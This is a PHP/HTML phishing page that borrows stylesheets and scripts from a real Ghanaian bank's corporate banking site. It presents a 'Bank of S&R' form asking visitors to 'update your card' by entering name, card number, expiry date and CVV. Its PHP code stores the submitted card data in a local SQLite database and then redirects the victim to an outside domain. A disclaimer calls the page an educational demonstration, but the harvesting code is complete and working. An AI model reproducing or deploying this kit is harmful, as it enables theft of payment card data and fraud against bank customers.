<!DOCTYPE html>
<html lang="en">
<head>
        <head>
        <title>Fidelity Corporate Internet Banking</title>
        <meta http-equiv="cache-control" content="no-cache"> 
        <meta http-equiv="cache-control" content="no-store"> 
        <meta http-equiv="Pragma" content="no-cache"> 
        <meta http-equiv="Expires" content=0>
        <meta http-equiv="X-UA-Compatible" content="IE=11">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="1024, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=2.0" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="default" />
        <meta name="HandheldFriendly" content="true" />
        <meta name="MobileOptimized" content="width" />
        
    
    
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/cmn/banking.uri.css" />
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/C_COLPAL1/scrollbars.uri.css" />
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/cmn/virtualkeyboard.uri.css" />

    <link type="text/css" rel="stylesheet" href="custom.css" />


    <!-- <link rel="shortcut icon" href="https://corporateibank.fidelitybank.com.gh/B001/images/oraclefav.ico" /> -->
    
    <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/JS/combined/jquery-includes.js" charset="utf-8"></script>
    <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/jsdir/common.js" charset="utf-8"></script>
</head>

<body>

    <div id="header">
		<div id="myHead">
        <p style="font-family: Garamond, serif;   font-size: 150%; font-weight: bold;"> Bank of S&R</p>
		</div>
		<form name="frmlang" method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
			
				<div id="main" style="left:0px;width:100%!important;position:relative !important">
                    <div id="section">
                    <div id="keyboard_firstrowtwrapper" style="background-color:#0e96bc">
                        <div id="keyboard_bankname">Please, complete the following form to update your card</div>
                      
                    </div>
                    <div id="rows">

                        <div class="container">
                            <div id="login-row" class="row justify-content-center align-items-center">
                                <div id="login-column" class="col-md-6">
                                    <div id="login-box" class="col-md-12">
                                            <div class="form-group">
                                                <label for="myCustomerName" class="text-info">Customer Name:</label>
                                                <br>
                                                <input type="text" name="myCustomerName" id="myCustomerName" class="form-control" required>
                                            </div>
                                           
                                            <div class="form-group">
                                                <label for="myAccount" class="text-info">Card Number (PAN):</label>
                                                <br>
                                                <input type="number" name="myAccount" id="myAccount" class="form-control" required>
                                            </div>

                                            <div class="form-group">
                                                <label for="expiryDate" class="text-info">Expiry Date:</label>
                                                <br>
                                                <input type="month" name="expiryDate" id="expiryDate" class="form-control" required>
                                            </div>

                                            <div class="form-group">
                                                <label for="myCVV" class="text-info">CVV:</label>
                                                <br>
                                                <input type="number" name="myCVV" id="myCVV" class="form-control" max="999"  required>
                                            </div>



                                            <div class="form-group">
                                            
                                                <br>


                                                <input type="submit" name="submit" class="btn btn-info btn-md" value="UPDATE CARD">
                                            </div>
                                            <br />


                                            <div id="disclaimer" class="text-right" style="color: red; font-weight:bold">
                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your bank information here. Thank you</p>
                                            </div>
                                    </div>
                                </div>
                            </div>
                        </div>


    

                    
		
		</form>


<?php
$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $myUsername = $_POST['myCustomerName'];
  $myAccount = $_POST['myAccount'];
  $expiryDate = $_POST['expiryDate'];
  $myCVV = $_POST['myCVV'];



if($myUsername !="" && $myAccount!="" && $expiryDate !="" && $myCVV !="" ){
$sql = "INSERT INTO cardupdate (cname,account,expiry,cvv) VALUES (?,?,?,?)";
$stmt= $db->prepare($sql);
$stmt->execute([$myUsername,$myAccount,$expiryDate,$myCVV ]);

if (!headers_sent()){
header("Location: http://snrbank.top/welcome/");
// exit();
} else {
	echo '<script type="text/javascript">';
	echo 'window.location.href="http://snrbank.top/welcome/";';
	echo '</script>';
	echo '<noscript>';
	echo '<meta http-equiv="refresh" content="0;url=http://snrbank.top/welcome/" />';
	echo '</noscript>';
}
}
}
?>

	</div>
	
	</div>
    


</body>
</html>